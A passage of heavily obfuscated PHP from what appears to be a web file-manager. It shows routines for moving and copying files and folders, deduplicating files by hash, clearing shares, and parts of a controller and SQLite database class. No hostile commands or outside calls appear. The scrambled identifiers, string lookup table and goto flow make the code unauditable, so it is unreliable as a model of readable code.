(isset($this->_childrenItemCache[$•ö±†¼¶])) { return $this->_childrenItemCache[$•ö±†¼¶]; } return $this->sourceInfo($•ö±†¼¶); } private function _childrenList($Œ¿Ãğ£±) { if (isset($this->_childrenListCache[$Œ¿Ãğ£±])) { return $this->_childrenListCache[$Œ¿Ãğ£±]; } return $this->_childrenListSelect($Œ¿Ãğ£±); } private function _childrenListSelect($ä¢ùê¹ü) { $Ö©ƒãÃ =& $_SERVER[¿ÈˆÑ¸ä]; $ïë‰–Ÿı = array($Ö©ƒãÃ[191] => $ä¢ùê¹ü, $Ö©ƒãÃ[516] => $this->targetIsDelete); $¼ÏŞù›Æ = $this->where($ïë‰–Ÿı)->select(); $¼ÏŞù›Æ = $¼ÏŞù›Æ ? $¼ÏŞù›Æ : array(); $×ö÷›ğ = array_to_keyvalue($¼ÏŞù›Æ, $Ö©ƒãÃ[192]); $this->_childrenListCache[$ä¢ùê¹ü] = $×ö÷›ğ; foreach ($×ö÷›ğ as $ä¢ùê¹ü => $æ’Œƒì) { $this->_childrenItemCache[$ä¢ùê¹ü] = $æ’Œƒì; } return $×ö÷›ğ; } private function fileNameExistAuto($Ó ŒÀÍ‹, $é¤âöñ©) { $Õ±ƒÙ™ =& $_SERVER[¿ÈˆÑ¸ä]; if ($é¤âöñ©[$Õ±ƒÙ™[516]] == $Õ±ƒÙ™[91]) { return $this->fileNameExist($Ó ŒÀÍ‹, $é¤âöñ©[$Õ±ƒÙ™[32]]); } return $this->fileNameExistCache($Ó ŒÀÍ‹, $é¤âöñ©[$Õ±ƒÙ™[32]]); } private function fileNameExistCache($¨“Éš÷, $×Ëä¢ô²) { $ê²†’³Õ =& $_SERVER[¿ÈˆÑ¸ä]; $×Ëä¢ô² = strtolower($×Ëä¢ô²); $ç¼Áî”† = $this->_childrenList($¨“Éš÷); foreach ($ç¼Áî”† as $à¤ÇÀâÖ) { if ($×Ëä¢ô² == strtolower($à¤ÇÀâÖ[$ê²†’³Õ[32]])) { return $à¤ÇÀâÖ[$ê²†’³Õ[192]]; } } return !1; } private function fileNameAutoCache($³¼ÆÇ­·, $–”óâÆ, $¨›„øÜ³, $¤¸®çøŠ) { $ÉÎÑøô =& $_SERVER[¿ÈˆÑ¸ä]; $½†ŞÍĞ = $this->_childrenList($³¼ÆÇ­·); $ë¹…¡¨ı = array_to_keyvalue($½†ŞÍĞ, $ÉÎÑøô[12], $ÉÎÑøô[32]); return $this->fileNameAutoGet($ë¹…¡¨ı, $–”óâÆ, $¨›„øÜ³, $¤¸®çøŠ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÊŒ¨É , $³şıÛ×®, $Ÿ°§“Ñğ = REPEAT_REPLACE, $Ğşôôâ  = '') { $­ÊÌóô =& $_SERVER[¿ÈˆÑ¸ä]; $ü¼¢Ì = $this->sourceInfo($ÊŒ¨É ); $¦§¹Ë‚µ = $this->sourceInfo($³şıÛ×®); if ($ü¼¢Ì[$­ÊÌóô[191]] == $¦§¹Ë‚µ[$­ÊÌóô[192]]) { if ($ü¼¢Ì[$­ÊÌóô[516]] == $­ÊÌóô[91]) { Model($­ÊÌóô[514])->restore(array($ÊŒ¨É )); } if (!$Ğşôôâ  || $Ğşôôâ  == $ü¼¢Ì[$­ÊÌóô[32]]) { return $ÊŒ¨É ; } } $„¿áÚ§Ù = $this->pathInfoMore($ÊŒ¨É ); if ($this->isParentOf($ÊŒ¨É , $³şıÛ×®)) { return !1; } if (!$ü¼¢Ì || !$¦§¹Ë‚µ || $¦§¹Ë‚µ[$­ÊÌóô[496]] != $­ÊÌóô[91]) { return !1; } Hook::trigger($­ÊÌóô[677], $„¿áÚ§Ù); $this->targetIsDelete = intval($ü¼¢Ì[$­ÊÌóô[516]]); if ($ü¼¢Ì[$­ÊÌóô[191]] == $³şıÛ×® && $Ğşôôâ  != $ü¼¢Ì[$­ÊÌóô[32]]) { $–©©ù™ = $this->fileNameExist($³şıÛ×®, $Ğşôôâ ); if ($–©©ù™ && $ü¼¢Ì[$­ÊÌóô[496]] == $­ÊÌóô[229]) { $®õæ¨·õ = $this->sourceInfo($–©©ù™); $ÄÙõ„ü = $this->fileHistory($®õæ¨·õ, $ü¼¢Ì[$­ÊÌóô[553]], $ü¼¢Ì[$­ÊÌóô[79]]); if (!$ÄÙõ„ü) { Model($­ÊÌóô[556])->remove($ü¼¢Ì[$­ÊÌóô[553]]); } $this->removeNow($ÊŒ¨É , !1); $this->folderSizeReset($³şıÛ×®); Hook::trigger($­ÊÌóô[678], $„¿áÚ§Ù); return $–©©ù™; } } $Ù¦¡ˆ° = $Ğşôôâ  ? $Ğşôôâ  : $ü¼¢Ì[$­ÊÌóô[32]]; $this->lockMoveStart($ÊŒ¨É ); $this->lockWriteStart($³şıÛ×®, $Ù¦¡ˆ°); $Ï›¾ç²õ = array($­ÊÌóô[648] => array(), $­ÊÌóô[679] => !1); $this->clearShare($ÊŒ¨É , $³şıÛ×®); $³‰Ò½¢Õ = $this->fileNameExistAuto($³şıÛ×®, $ü¼¢Ì); $¶ó­Ğã„ = $this->_move($ÊŒ¨É , $³şıÛ×®, $Ÿ°§“Ñğ, $Ï›¾ç²õ, $Ğşôôâ ); $this->sourceCacheClear(); if ($ü¼¢Ì[$­ÊÌóô[496]] == $­ÊÌóô[91] && $³‰Ò½¢Õ) { $this->folderSizeResetChildren($¶ó­Ğã„); } Model($­ÊÌóô[231])->linkAdd($Ï›¾ç²õ[$­ÊÌóô[648]]); if ($¶ó­Ğã„ && $³‰Ò½¢Õ && $Ï›¾ç²õ[$­ÊÌóô[679]]) { $æ×õ°Û¦ = $ü¼¢Ì[$­ÊÌóô[496]] == $­ÊÌóô[91] ? $this->_childrenListSelect($ÊŒ¨É ) : !1; $‰ªúçõş = $æ×õ°Û¦ && count($æ×õ°Û¦) > 0 ? !0 : !1; $this->removeNow($ÊŒ¨É , $‰ªúçõş); } $this->lockMoveEnd($ÊŒ¨É ); $this->lockWriteEnd($³şıÛ×®, $Ù¦¡ˆ°); $this->folderSizeReset($ü¼¢Ì[$­ÊÌóô[191]]); $this->folderSizeReset($³şıÛ×®); $ÄÂÅÙæ„ = array($ü¼¢Ì[$­ÊÌóô[191]], $³şıÛ×®); if ($ü¼¢Ì[$­ÊÌóô[496]] == $­ÊÌóô[91]) { $ÄÂÅÙæ„[] = $ÊŒ¨É ; } $this->updateModifyTime($ÄÂÅÙæ„); Model($­ÊÌóô[652])->eventMove($ÊŒ¨É , $ü¼¢Ì[$­ÊÌóô[191]], $³şıÛ×®); Hook::trigger($­ÊÌóô[678], $„¿áÚ§Ù); return $¶ó­Ğã„; } private function _move($œ¥³Ø›§, $ˆ÷ÂÁâ, $ø—Ÿö›·, &$ÀÔğüÈÀ, $Èã°ğå´ = '') { $ãÒ¯Äß =& $_SERVER[¿ÈˆÑ¸ä]; $Ñ¢ÂÒÎë = $this->sourceInfo($œ¥³Ø›§); $Èøï·ôõ = $Ñ¢ÂÒÎë[$ãÒ¯Äß[496]] == $ãÒ¯Äß[91]; $ĞÏšåæ¹ = $Èã°ğå´ ? $Èã°ğå´ : $Ñ¢ÂÒÎë[$ãÒ¯Äß[32]]; $ê°ûòó× = $this->fileNameExistAuto($ˆ÷ÂÁâ, $Ñ¢ÂÒÎë); $this->lockMoveStart($œ¥³Ø›§); $this->lockWriteStart($ˆ÷ÂÁâ, $ĞÏšåæ¹); if (!$ê°ûòó×) { return $this->_moveForce($œ¥³Ø›§, $ˆ÷ÂÁâ, $ĞÏšåæ¹); } $€ËòÀíİ = $ê°ûòó×; $ò½À¨¬ = !1; if ($Èøï·ôõ) { if ($ø—Ÿö›· == REPEAT_RENAME_FOLDER) { $ĞÏšåæ¹ = $this->fileNameAuto($ˆ÷ÂÁâ, $ĞÏšåæ¹, $ø—Ÿö›·, $Èøï·ôõ); $€ËòÀíİ = $this->_moveForce($œ¥³Ø›§, $ˆ÷ÂÁâ, $ĞÏšåæ¹); } else { $ÖŠ‰™» = $this->_childrenListSelect($œ¥³Ø›§); foreach ($ÖŠ‰™» as $‘Â‘ğ’) { $Èº—ôÊÂ = REPEAT_REPLACE; $this->_move($‘Â‘ğ’[$ãÒ¯Äß[192]], $ê°ûòó×, $Èº—ôÊÂ, $ÀÔğüÈÀ); } $ò½À¨¬ = !0; } } else { if ($ø—Ÿö›· == REPEAT_RENAME || $ø—Ÿö›· == REPEAT_RENAME_FOLDER) { $ĞÏšåæ¹ = $this->fileNameAuto($ˆ÷ÂÁâ, $ĞÏšåæ¹, $ø—Ÿö›·, $Èøï·ôõ); $€ËòÀíİ = $this->_moveForce($œ¥³Ø›§, $ˆ÷ÂÁâ, $ĞÏšåæ¹); } else { $Æ´£Ï¾¶ = $this->sourceInfoCache($ê°ûòó×); $¸‘ËÛ£ = $this->fileHistory($Æ´£Ï¾¶, $Ñ¢ÂÒÎë[$ãÒ¯Äß[553]], $Ñ¢ÂÒÎë[$ãÒ¯Äß[79]]); if ($¸‘ËÛ£) { $ÀÔğüÈÀ[$ãÒ¯Äß[648]][] = $Ñ¢ÂÒÎë[$ãÒ¯Äß[553]]; } $ò½À¨¬ = !0; } } if ($ò½À¨¬) { $ÀÔğüÈÀ[$ãÒ¯Äß[679]] = !0; } return $€ËòÀíİ; } private function _moveForce($û ¦ä¨˜, $²øµ„ü, $µÄó¸¬¡) { $ªÂŠ¤·ø =& $_SERVER[¿ÈˆÑ¸ä]; $ƒ¥úÑ§‹ = $this->sourceInfo($û ¦ä¨˜); $À¾’óù = $this->sourceInfo($²øµ„ü); $£ş«³ß = $ƒ¥úÑ§‹[$ªÂŠ¤·ø[496]] == $ªÂŠ¤·ø[91]; $şİ²ĞÈî = array($ªÂŠ¤·ø[488] => $À¾’óù[$ªÂŠ¤·ø[192]], $ªÂŠ¤·ø[671] => $À¾’óù[$ªÂŠ¤·ø[600]] . $À¾’óù[$ªÂŠ¤·ø[192]] . $ªÂŠ¤·ø[50], $ªÂŠ¤·ø[667] => $À¾’óù[$ªÂŠ¤·ø[189]], $ªÂŠ¤·ø[668] => $À¾’óù[$ªÂŠ¤·ø[585]], $ªÂŠ¤·ø[670] => USER_ID, $ªÂŠ¤·ø[505] => $µÄó¸¬¡); $ï±åñ‚¾ = $ƒ¥úÑ§‹[$ªÂŠ¤·ø[189]] == SourceModel::TYPE_GROUP && $À¾’óù[$ªÂŠ¤·ø[189]] == SourceModel::TYPE_GROUP && $ƒ¥úÑ§‹[$ªÂŠ¤·ø[585]] == $À¾’óù[$ªÂŠ¤·ø[585]]; if (!$ï±åñ‚¾ && $this->moveClearAuth) { Model($ªÂŠ¤·ø[583])->authClear($û ¦ä¨˜); } $Ççö†½ = $ƒ¥úÑ§‹[$ªÂŠ¤·ø[516]] == $ªÂŠ¤·ø[91] && $À¾’óù[$ªÂŠ¤·ø[516]] != $ªÂŠ¤·ø[91]; if ($Ççö†½) { $şİ²ĞÈî[$ªÂŠ¤·ø[515]] = 0; } if ($£ş«³ß) { $¤„ˆÇé¯ = array($ªÂŠ¤·ø[671] => array($ªÂŠ¤·ø[631], $ƒ¥úÑ§‹[$ªÂŠ¤·ø[600]] . $ƒ¥úÑ§‹[$ªÂŠ¤·ø[192]] . $ªÂŠ¤·ø[632])); $± …êø = $ƒ¥úÑ§‹[$ªÂŠ¤·ø[600]] . $ƒ¥úÑ§‹[$ªÂŠ¤·ø[192]] . $ªÂŠ¤·ø[50]; $íğšäÁ = $À¾’óù[$ªÂŠ¤·ø[600]] . $À¾’óù[$ªÂŠ¤·ø[192]] . $ªÂŠ¤·ø[50] . $ƒ¥úÑ§‹[$ªÂŠ¤·ø[192]] . $ªÂŠ¤·ø[50]; $ö‹‹¤œå = array($ªÂŠ¤·ø[671] => array($ªÂŠ¤·ø[680], "\x72\145\x70\154\x61\x63\145\50\160\x61\x72\x65\x6e\x74\114\145\166\145\154\54\47{$± …êø}\x27\54\x27{$íğšäÁ}\47\51"), $ªÂŠ¤·ø[667] => $À¾’óù[$ªÂŠ¤·ø[189]], $ªÂŠ¤·ø[668] => $À¾’óù[$ªÂŠ¤·ø[585]]); if ($Ççö†½) { $ö‹‹¤œå[$ªÂŠ¤·ø[515]] = 0; } $this->where($¤„ˆÇé¯)->data($ö‹‹¤œå)->save(); } $this->where(array($ªÂŠ¤·ø[502] => $û ¦ä¨˜))->data($şİ²ĞÈî)->save(); return $û ¦ä¨˜; } private function clearShare($îÇêøÂ, $¼İÉ¼»·) { $©—ÀŞ¤ê =& $_SERVER[¿ÈˆÑ¸ä]; $„õ­Òïª = $this->sourceInfo($îÇêøÂ); $°æÈÕ™â = $this->sourceInfo($¼İÉ¼»·); if ($„õ­Òïª[$©—ÀŞ¤ê[585]] == $°æÈÕ™â[$©—ÀŞ¤ê[585]] && $„õ­Òïª[$©—ÀŞ¤ê[189]] == $©—ÀŞ¤ê[681]) { return; } $’š©æ¤Ğ = array($©—ÀŞ¤ê[600] => array($©—ÀŞ¤ê[631], $„õ­Òïª[$©—ÀŞ¤ê[600]] . $îÇêøÂ . $©—ÀŞ¤ê[632])); $Å­ñÉó = $this->field($©—ÀŞ¤ê[502])->where($’š©æ¤Ğ)->getField($©—ÀŞ¤ê[192], !0); if (!$Å­ñÉó) { return; } $’š©æ¤Ğ = array($©—ÀŞ¤ê[192] => array($©—ÀŞ¤ê[7], $Å­ñÉó), $©—ÀŞ¤ê[682] => 1); $ØõÈø—Ø = Model($©—ÀŞ¤ê[683])->field($©—ÀŞ¤ê[684])->where($’š©æ¤Ğ)->select(); if (!$ØõÈø—Ø) { return; } $ØõÈø—Ø = array_to_keyvalue($ØõÈø—Ø, $©—ÀŞ¤ê[12], $©—ÀŞ¤ê[684]); $’š©æ¤Ğ = array($©—ÀŞ¤ê[684] => array($©—ÀŞ¤ê[7], $ØõÈø—Ø)); Model($©—ÀŞ¤ê[683])->where($’š©æ¤Ğ)->save(array($©—ÀŞ¤ê[682] => 0)); Model($©—ÀŞ¤ê[685])->where($’š©æ¤Ğ)->delete(); } public function copyFolderFromIO($¯…ôİî±, $ÃøÎàÙä, $Å¡ú·Ö‰, $««œ½ù¯, $úÎ²ÛÎ, $®ùª¦ = false) { $¯Š›Ò¸­ =& $_SERVER[¿ÈˆÑ¸ä]; $©‰…ºû = array($¯Š›Ò¸­[649] => array(), $¯Š›Ò¸­[650] => array(), $¯Š›Ò¸­[648] => array(), $¯Š›Ò¸­[686] => array()); $Û·éÖƒ– = $®ùª¦ ? $®ùª¦ : $¯…ôİî±->pathThis($ÃøÎàÙä); $ú´£ş¦ = $this->fileNameExist($Å¡ú·Ö‰, $Û·éÖƒ–); $â®ŸŒ¥ì = $this->mkdir($Å¡ú·Ö‰, $Û·éÖƒ–, $««œ½ù¯); if (!$ú´£ş¦ || $««œ½ù¯ == REPEAT_RENAME_FOLDER) { $««œ½ù¯ = !1; } if ($ú´£ş¦) { $this->_childrenAllMake($ú´£ş¦); } Hook::trigger($¯Š›Ò¸­[687]); $³úÜœÇá = KodIO::ioFileDriverGet($¯Š›Ò¸­[494] . $Å¡ú·Ö‰ . $¯Š›Ò¸­[403]); $this->_copyChildTo($¯…ôİî±, $ÃøÎàÙä, $â®ŸŒ¥ì, $««œ½ù¯, $©‰…ºû, $úÎ²ÛÎ, $³úÜœÇá); Hook::trigger($¯Š›Ò¸­[688]); if ($â®ŸŒ¥ì) { $this->folderSizeResetChildren($â®ŸŒ¥ì); } $this->_childrenListClear(); Model($¯Š›Ò¸­[651])->addAll($©‰…ºû[$¯Š›Ò¸­[649]], array(), !0); Model($¯Š›Ò¸­[652])->eventCopy($â®ŸŒ¥ì); $this->saveAll($©‰…ºû[$¯Š›Ò¸­[650]]); Model($¯Š›Ò¸­[556])->linkAdd($©‰…ºû[$¯Š›Ò¸­[648]]); Model($¯Š›Ò¸­[556])->remove($©‰…ºû[$¯Š›Ò¸­[686]]); $this->folderSizeReset($Å¡ú·Ö‰); $this->updateModifyTime($Å¡ú·Ö‰); return $â®ŸŒ¥ì; } private function _copyChildTo($¬ ÒÚ¥¡, $ğ³ÚÌÒ, $°¡÷ûÕŒ, $à«Ú¼¯, &$¹›…ÖÉœ, $€ù˜€»¹, $›Ó‹ï²) { $´ûë™¿‘ =& $_SERVER[¿ÈˆÑ¸ä]; $ğ•„šÏé = $this->sourceInfoCache($°¡÷ûÕŒ); $Ãï‡ ”µ = $¬ ÒÚ¥¡->listPath($ğ³ÚÌÒ); $Ãï‡ ”µ = $Ãï‡ ”µ ? $Ãï‡ ”µ : array($´ûë™¿‘[86] => array(), $´ûë™¿‘[85] => array()); $˜üç—Ç = array_merge($Ãï‡ ”µ[$´ûë™¿‘[86]], $Ãï‡ ”µ[$´ûë™¿‘[85]]); $æ‚ÛÛğ’ = $this->_addFiles($¬ ÒÚ¥¡, $›Ó‹ï², $Ãï‡ ”µ[$´ûë™¿‘[86]], $€ù˜€»¹); $ì¡ù™÷Ş = array(); foreach ($˜üç—Ç as &$Â»ğõ±Á) { if (isset($æ‚ÛÛğ’[$Â»ğõ±Á[$´ûë™¿‘[32]]])) { $Â»ğõ±Á = $æ‚ÛÛğ’[$Â»ğõ±Á[$´ûë™¿‘[32]]]; } $Â»ğõ±Á[$´ûë™¿‘[496]] = $Â»ğõ±Á[$´ûë™¿‘[33]] == $´ûë™¿‘[78]; $Â»ğõ±Á[$´ûë™¿‘[497]] = substr(_get($Â»ğõ±Á, $´ûë™¿‘[167], $´ûë™¿‘[12]), 0, 10); $Â»ğõ±Á[$´ûë™¿‘[79]] = _get($Â»ğõ±Á, $´ûë™¿‘[79], 0); $Â»ğõ±Á[$´ûë™¿‘[553]] = _get($Â»ğõ±Á, $´ûë™¿‘[553], 0); if (!isset($Â»ğõ±Á[$´ûë™¿‘[689]]) && $Â»ğõ±Á[$´ûë™¿‘[553]]) { $¹›…ÖÉœ[$´ûë™¿‘[686]][] = $Â»ğõ±Á[$´ûë™¿‘[553]]; } if ($à«Ú¼¯) { $µıÏÌš = $this->fileNameExistCache($°¡÷ûÕŒ, $Â»ğõ±Á[$´ûë™¿‘[32]]); if ($µıÏÌš) { if ($Â»ğõ±Á[$´ûë™¿‘[496]] || $à«Ú¼¯ == REPEAT_SKIP) { continue; } if ($à«Ú¼¯ == REPEAT_REPLACE) { $„™óú÷¬ = $this->sourceInfoCache($µıÏÌš); $ö¢ö¤ß© = $this->fileHistory($„™óú÷¬, $Â»ğõ±Á[$´ûë™¿‘[553]], $Â»ğõ±Á[$´ûë™¿‘[79]]); if ($ö¢ö¤ß©) { $¹›…ÖÉœ[$´ûë™¿‘[648]][] = $Â»ğõ±Á[$´ûë™¿‘[553]]; } continue; } else { if ($à«Ú¼¯ == REPEAT_RENAME) { $Â»ğõ±Á[$´ûë™¿‘[32]] = $this->fileNameAutoCache($°¡÷ûÕŒ, $Â»ğõ±Á[$´ûë™¿‘[32]], $à«Ú¼¯, !1); } } } } if (!$Â»ğõ±Á[$´ûë™¿‘[496]] && $Â»ğõ±Á[$´ûë™¿‘[553]] == 0) { continue; } if (!$Â»ğõ±Á[$´ûë™¿‘[496]] && $Â»ğõ±Á[$´ûë™¿‘[553]]) { $¹›…ÖÉœ[$´ûë™¿‘[648]][] = $Â»ğõ±Á[$´ûë™¿‘[553]]; } $ì¡ù™÷Ş[] = $this->_makeItemData($Â»ğõ±Á, $ğ•„šÏé, $Â»ğõ±Á[$´ûë™¿‘[32]]); } unset($Â»ğõ±Á); if (!empty($ì¡ù™÷Ş)) { $this->addAll($ì¡ù™÷Ş); $this->_childrenListSelect($°¡÷ûÕŒ); } $ë•š‚âí = $this->_childrenList($°¡÷ûÕŒ); $ë•š‚âí = array_to_keyvalue($ë•š‚âí, $´ûë™¿‘[32]); foreach ($˜üç—Ç as $Â»ğõ±Á) { $„™óú÷¬ = $ë•š‚âí[$Â»ğõ±Á[$´ûë™¿‘[32]]]; $ˆ‡ûíÇ¨ = $„™óú÷¬[$´ûë™¿‘[192]]; $this->_copyApplyMeta($„™óú÷¬, $¹›…ÖÉœ); if ($Â»ğõ±Á[$´ûë™¿‘[33]] == $´ûë™¿‘[78]) { $Â»ğõ±Á[$´ûë™¿‘[87]] = $¬ ÒÚ¥¡->getPathInner($Â»ğõ±Á[$´ûë™¿‘[87]]); $this->_copyChildTo($¬ ÒÚ¥¡, $Â»ğõ±Á[$´ûë™¿‘[87]], $ˆ‡ûíÇ¨, $à«Ú¼¯, $¹›…ÖÉœ, $€ù˜€»¹, $›Ó‹ï²); } } } private function _addFiles($Şü¯Ë„£, $ŞÁ™ÙŸ, $÷€üÉõß, $×î‰“”) { $ÖÈşóÅÜ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$÷€üÉõß || count($÷€üÉõß) == 0) { return array(); } $íÏïä­¸ = array(); foreach ($÷€üÉõß as &$ôë±¸Å×) { Hook::trigger($ÖÈşóÅÜ[690], $ôë±¸Å×); $ôë±¸Å×[$ÖÈşóÅÜ[87]] = $Şü¯Ë„£->getPathInner($ôë±¸Å×[$ÖÈşóÅÜ[87]]); $Ú´¼“Üš = $Şü¯Ë„£->hashSimple($ôë±¸Å×[$ÖÈşóÅÜ[87]]); $‡ßŞŒØÏ = $Şü¯Ë„£->hashMd5($ôë±¸Å×[$ÖÈşóÅÜ[87]]); if (strlen($‡ßŞŒØÏ) > 10 && !isset($íÏïä­¸[$‡ßŞŒØÏ])) { $íÏïä­¸[$‡ßŞŒØÏ] = array(); } $ôë±¸Å×[$ÖÈşóÅÜ[691]] = $Ú´¼“Üš; $ôë±¸Å×[$ÖÈşóÅÜ[559]] = $‡ßŞŒØÏ; $íÏïä­¸[$‡ßŞŒØÏ][] =& $ôë±¸Å×; if (count($íÏïä­¸[$‡ßŞŒØÏ]) > 1) { $ôë±¸Å×[$ÖÈşóÅÜ[689]] = !0; } Hook::trigger($ÖÈşóÅÜ[692], $ôë±¸Å×); } unset($ôë±¸Å×); $íıµ«Ñ = array($ÖÈşóÅÜ[559] => array($ÖÈşóÅÜ[7], array_keys($íÏïä­¸))); $Ú°ó¹Û = Model($ÖÈşóÅÜ[693]); $ŠŞºòŞ’ = $Ú°ó¹Û->where($íıµ«Ñ)->select(); $ŠŞºòŞ’ = $ŠŞºòŞ’ ? $ŠŞºòŞ’ : array(); foreach ($ŠŞºòŞ’ as $®ò˜€Š) { if (!isset($íÏïä­¸[$®ò˜€Š[$ÖÈşóÅÜ[559]]])) { continue; } $ĞÕ„””Å = $íÏïä­¸[$®ò˜€Š[$ÖÈşóÅÜ[559]]]; foreach ($ĞÕ„””Å as &$ôë±¸Å×) { $ôë±¸Å×[$ÖÈşóÅÜ[553]] = $®ò˜€Š[$ÖÈşóÅÜ[553]]; $ôë±¸Å×[$ÖÈşóÅÜ[689]] = !0; } unset($ôë±¸Å×); } $Ö©İ‘Ò = array(); foreach ($÷€üÉõß as $—Ê›ğÜ«) { Hook::trigger($ÖÈşóÅÜ[694], $—Ê›ğÜ«); if (isset($—Ê›ğÜ«[$ÖÈşóÅÜ[689]]) && $—Ê›ğÜ«[$ÖÈşóÅÜ[689]]) { Hook::trigger($ÖÈşóÅÜ[695], $—Ê›ğÜ«); continue; } $Ñ€Õ¾²ì = $Şü¯Ë„£->getPathInner($—Ê›ğÜ«[$ÖÈşóÅÜ[87]]); $â©‚»Á = $Ú°ó¹Û->addFileMake($Ñ€Õ¾²ì, $ŞÁ™ÙŸ, $—Ê›ğÜ«[$ÖÈşóÅÜ[79]], $—Ê›ğÜ«[$ÖÈşóÅÜ[691]], $—Ê›ğÜ«[$ÖÈşóÅÜ[559]], $—Ê›ğÜ«[$ÖÈşóÅÜ[32]], $×î‰“”); Hook::trigger($ÖÈşóÅÜ[695], $—Ê›ğÜ«); if (!is_array($â©‚»Á)) { continue; } $Ö©İ‘Ò[] = $â©‚»Á; } $Ú°ó¹Û->addAll($Ö©İ‘Ò); $íıµ«Ñ = array($ÖÈşóÅÜ[559] => array($ÖÈşóÅÜ[7], array_keys($íÏïä­¸))); $ŠŞºòŞ’ = $Ú°ó¹Û->where($íıµ«Ñ)->select(); $ŠŞºòŞ’ = $ŠŞºòŞ’ ? $ŠŞºòŞ’ : array(); foreach ($ŠŞºòŞ’ as $®ò˜€Š) { if (!isset($íÏïä­¸[$®ò˜€Š[$ÖÈşóÅÜ[559]]])) { continue; } $¯Ëù‚»¾ =& $íÏïä­¸[$®ò˜€Š[$ÖÈşóÅÜ[559]]]; foreach ($¯Ëù‚»¾ as &$ôë±¸Å×) { $ôë±¸Å×[$ÖÈşóÅÜ[553]] = $®ò˜€Š[$ÖÈşóÅÜ[553]]; } unset($ôë±¸Å×); } $¢Ï»Ó°» = array(); foreach ($÷€üÉõß as $É›ÈÓÄÀ) { $¢Ï»Ó°»[$É›ÈÓÄÀ[$ÖÈşóÅÜ[32]]] = $É›ÈÓÄÀ; } return $¢Ï»Ó°»; } } define($_SERVER[¿ÈˆÑ¸ä][696], $_SERVER[¿ÈˆÑ¸ä][697]); $nayufsprbt = $_SERVER[¿ÈˆÑ¸ä][698]; goto B‰§¢ôçä; E¶÷¸¬¸ë‚: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $²¹¦Ë‚† =& $_SERVER[¿ÈˆÑ¸ä]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$²¹¦Ë‚†[6]] =& $config; $this->values[$²¹¦Ë‚†[7]] =& $in; $this->tpl = TEMPLATE . MOD . $²¹¦Ë‚†[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ø§Şâ®È) { if (1 === func_num_args()) { $this->{$Ø§Şâ®È} = new $Ø§Şâ®È(); } else { $´àº¹ÅÑ = new ReflectionClass($Ø§Şâ®È); $À°Ëçõ° = func_get_args(); array_shift($À°Ëçõ°); $this->{$Ø§Şâ®È} = $´àº¹ÅÑ->newInstanceArgs($À°Ëçõ°); } return $this->{$Ø§Şâ®È}; } public function routeBind($Â÷Îƒé›, $²ØÓ»‚æ, $ç½¦Ëá† = 3) { $Âå“Ê½» =& $_SERVER[¿ÈˆÑ¸ä]; $°Ñğì¾§ = $this->in[$Âå“Ê½»[9]]; $Â÷Îƒé› = str_replace($Âå“Ê½»[10], $Âå“Ê½»[11], trim(trim($Â÷Îƒé›, $Âå“Ê½»[8]), $Âå“Ê½»[12])); if (!$Â÷Îƒé› || count($°Ñğì¾§) <= $ç½¦Ëá†) { return !1; } $–åÓ­»ß = !0; $ú·À÷»Ş = explode($Âå“Ê½»[8], $Â÷Îƒé›); for ($¨Ş„Ÿ©€ = 0; $¨Ş„Ÿ©€ < count($ú·À÷»Ş); $¨Ş„Ÿ©€++) { if ($ú·À÷»Ş[$¨Ş„Ÿ©€] != $°Ñğì¾§[$ç½¦Ëá† + $¨Ş„Ÿ©€]) { $–åÓ­»ß = !1; break; } } if (!$–åÓ­»ß) { return; } call_user_func_array(array($this, $²ØÓ»‚æ), array()); } public function routeArgs($´Â‹‡®â = 3) { $ñº¾Ë = $this->in[$_SERVER[¿ÈˆÑ¸ä][9]]; if (count($ñº¾Ë) <= $´Â‹‡®â) { return array(); } $Ğ‘ÂÏƒæ = array(); for ($¡†ÃœˆÃ = $´Â‹‡®â; $¡†ÃœˆÃ < count($ñº¾Ë); $¡†ÃœˆÃ += 2) { $Ğ‘ÂÏƒæ[$ñº¾Ë[$¡†ÃœˆÃ]] = $ñº¾Ë[$¡†ÃœˆÃ + 1]; $this->in[$ñº¾Ë[$¡†ÃœˆÃ]] = $ñº¾Ë[$¡†ÃœˆÃ + 1]; } return $Ğ‘ÂÏƒæ; } protected function assign($Ï ÜÎŠÄ, $š¥’ìé¢) { $this->values[$Ï ÜÎŠÄ] = $š¥’ìé¢; } protected function display($§è¸“¶ù) { ob_end_clean(); extract($this->values); require $this->tpl . $§è¸“¶ù; } } class DbSqliteBase extends Db { public function __construct($¦ÓúÊ‹Ô = '') { $¤ï™ã×‡ =& $_SERVER[¿ÈˆÑ¸ä]; if (!extension_loaded($¤ï™ã×‡[13])) { think_exception(think_lang($¤ï™ã×‡[14]) . $¤ï™ã×‡[15]); } if (!empty($¦ÓúÊ‹Ô)) { if (!isset($¦ÓúÊ‹Ô[$¤ï™ã×‡[16]])) { $¦ÓúÊ‹Ô[$¤ï™ã×‡[16]] = 438; } $this->config = $¦ÓúÊ‹Ô; if (empty($this->config[$¤ï™ã×‡[17]])) { $this->config[$¤ï™ã×‡[17]] = array(); } } } public function connect($ä¼Ïˆó™ = '', $‡¹ ¡ = 0) { $ÊšáŠ¦› =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($this->linkID[$‡¹ ¡])) { if (empty($ä¼Ïˆó™)) { $ä¼Ïˆó™ = $this->config; } $ïÔÕãÔ— = !empty($ä¼Ïˆó™[$ÊšáŠ¦›[17]][$ÊšáŠ¦›[18]]) ? $ä¼Ïˆó™[$ÊšáŠ¦›[17]][$ÊšáŠ¦›[18]] : $this->pconnect; $Ç’ª÷§ = $ïÔÕãÔ— ? $ÊšáŠ¦›[19] : $ÊšáŠ¦›[20]; $this->linkID[$‡¹ ¡] = $Ç’ª÷§($ä¼Ïˆó™[$ÊšáŠ¦›[21]], $ä¼Ïˆó™[$ÊšáŠ¦›[16]]); if (!$this->linkID[$‡¹ ¡]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$‡¹ ¡], 30000); if (1 != think_config($ÊšáŠ¦›[22])) { unset($this->config); } } return $this->linkID[$‡¹ ¡]; } public function free() { $this->queryID = null; } public function query($›¾ÑÈ¸) { $ƒ‹†…Ôû =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = 